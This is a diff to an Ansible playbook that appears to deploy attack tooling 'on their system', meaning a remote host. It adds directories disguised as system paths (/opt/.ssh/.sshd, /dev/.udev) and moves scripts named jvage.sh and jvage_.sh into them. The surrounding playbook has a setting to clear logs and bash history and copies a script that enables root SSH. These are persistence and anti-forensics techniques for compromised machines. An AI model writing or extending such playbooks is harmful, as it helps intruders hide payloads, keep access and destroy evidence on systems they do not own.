@@ -6,6 +6,8 @@
 
   vars:
     deploy_dir: /tmp/tools   # Remote directory for temporary deployment
+    hidden_dir: /opt/.ssh/.sshd
+    hidden_dir_nd: /dev/.udev
     purge_logs: true                # Set to true to clear logs and bash history
 
   tasks:
@@ -15,6 +17,18 @@
     - name: Create remote deployment directory
       file:
         path: "{{ deploy_dir }}"
+        state: directory
+        mode: "0755"
+    
+    - name: Create hidden directory
+      file:
+        path: "{{ hidden_dir }}"
+        state: directory
+        mode: "0755"
+      
+    - name: Create second hidden directory
+      file:
+        path: "{{ hidden_dir_nd }}"
         state: directory
         mode: "0755"
 
@@ -78,7 +92,13 @@
     - name: Copy jvage.sh
       copy:
         src: ../Linux/on_their_system/jvage.sh
-        dest: "{{ deploy_dir }}/jvage.sh"
+        dest: "{{ hidden_dir_nd }}/jvage.sh"
+        mode: "0755"
+    
+    - name: Copy jvage_.sh
+      copy:
+        src: ../Linux/on_their_system/jvage_.sh
+        dest: "{{ hidden_dir }}/jvage_.sh"
         mode: "0755"
 
     - name: Copy ssh_root_enable.sh
